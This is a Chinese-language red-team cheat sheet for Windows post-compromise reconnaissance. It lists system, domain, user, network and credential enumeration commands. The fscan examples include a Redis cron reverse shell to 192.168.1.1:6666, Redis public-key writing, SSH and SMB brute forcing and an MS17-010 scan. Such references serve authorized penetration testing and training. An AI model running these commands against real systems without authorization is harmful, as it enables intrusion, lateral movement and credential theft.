信息收集 - Windows
========================================

基本命令
----------------------------------------
- 查询所有计算机名称 ``dsquery computer``
- 查看配置 ``systeminfo``
- 查看版本 ``ver``
- 进程信息 ``tasklist /svc``
- 查看所有环境变量 ``set``
- 查看计划任务 ``schtasks /QUERY /fo LIST /v``
- 查看安装驱动 ``DRIVERQUERY``
- 查看操作系统架构 ``wmic os get osarchitecture``
- 查看逻辑盘 ``wmic logicaldisk get caption``
- 查看安装的软件 ``wmic product get name,version``

域信息
----------------------------------------
- 获取当前组的计算机名 ``net view``
- 查看所有域 ``net view /domain``
- 查看域中的用户名 ``dsquery user``
- 查询域组名称 ``net group /domain``
- 查询域管理员 ``net group "Domain Admins" /domain``
- 查看域控制器 ``net group "Domain controllers"``

用户信息
----------------------------------------
- 查看用户 ``net user`` / ``whoami`` / ``whoami /all``
- 查看用户信息: ``net user <administrator>``
- 用户特权信息 ``whoami /priv``
- 查看当前权限 ``net localgroup administrators``
- 查看在线用户 ``qwinsta`` / ``query user`` / ``quser``
- 查看当前计算机名，全名，用户名，系统版本，工作 站域，登陆域 ``net config Workstation``

网络信息
----------------------------------------
- 域控信息
	+ ``nltest /dclist:xx``
	+ ``Get-NetDomain``
	+ ``Get-NetDomainController``
- 网卡信息 ``ipconfig``
- ARP表 ``arp -a``
- 路由表 ``route print``
- 监听的端口 ``netstat -ano``
- 查看netbios：``nbtscan 192.168.1.17``
- 防火墙状态及规则
	+ ``netsh firewall show config``
	+ ``netsh firewall show state``
- hosts文件
- 扫描工具
	+ fscan：``https://github.com/shadow1ng/fscan``
		::
		
			fscan.exe -h 192.168.1.1/24  (默认使用全部模块)  
			fscan.exe -h 192.168.1.1/16  (B段扫描)
			fscan.exe -h 192.168.1.1/24 -np -no -nopoc(跳过存活检测 、不保存文件、跳过web poc扫描)  
			fscan.exe -h 192.168.1.1/24 -rf id_rsa.pub (redis 写公钥)  
			fscan.exe -h 192.168.1.1/24 -rs 192.168.1.1:6666 (redis 计划任务反弹shell)  
			fscan.exe -h 192.168.1.1/24 -c whoami (ssh 爆破成功后，命令执行)  
			fscan.exe -h 192.168.1.1/24 -m ssh -p 2222 (指定模块ssh和端口)  
			fscan.exe -h 192.168.1.1/24 -pwdf pwd.txt -userf users.txt (加载指定文件的用户名、密码来进行爆破)  
			fscan.exe -h 192.168.1.1/24 -o /tmp/1.txt (指定扫描结果保存路径,默认保存在当前路径)   
			fscan.exe -h 192.168.1.1/8  (A段的192.x.x.1和192.x.x.254,方便快速查看网段信息 )  
			fscan.exe -h 192.168.1.1/24 -m smb -pwd password (smb密码碰撞)  
			fscan.exe -h 192.168.1.1/24 -m ms17010 (指定模块)  
			fscan.exe -hf ip.txt  (以文件导入)

密码信息
----------------------------------------
+ 当前系统凭据
	- ``cmdkey /l``

其他
----------------------------------------
+ wmic
	- 提供了从命令行接口和批命令脚本执行系统管理的支持
	- 查看补丁安装情况: ``wmic qfe get Caption,Description,HotFixID,InstalledOn``
+ 日志与事件信息
	- ``wevtutil``
+ 注册表信息
	- ``reg``
